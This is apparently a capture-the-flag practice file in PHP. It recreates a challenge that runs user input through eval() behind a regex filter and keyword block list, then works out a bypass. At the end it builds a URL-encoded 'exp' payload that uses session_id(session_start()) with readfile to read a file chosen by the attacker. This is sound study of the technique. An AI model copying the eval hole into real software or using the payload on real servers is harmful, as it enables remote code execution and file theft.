<?php
echo "flag在哪里呢？<br>";

$q='echo(a,echo());';
if(isset($q)){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $q)) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $q)) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $q)) {
                // echo $_GET['exp'];
                echo(1);
                @eval($q);
            }
            else{
                echo("qwe");
            }
        }
        else{
            echo("zxc");
        }
    }
    else{
        echo("asd");
    }
}
// highlight_file(__FILE__);
chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));
array_rand();
array_flip();
session_id();
var_dump(session_id(session_start()));
echo urlencode('exp=var_dump(readfile(session_id(session_start())));');
?>
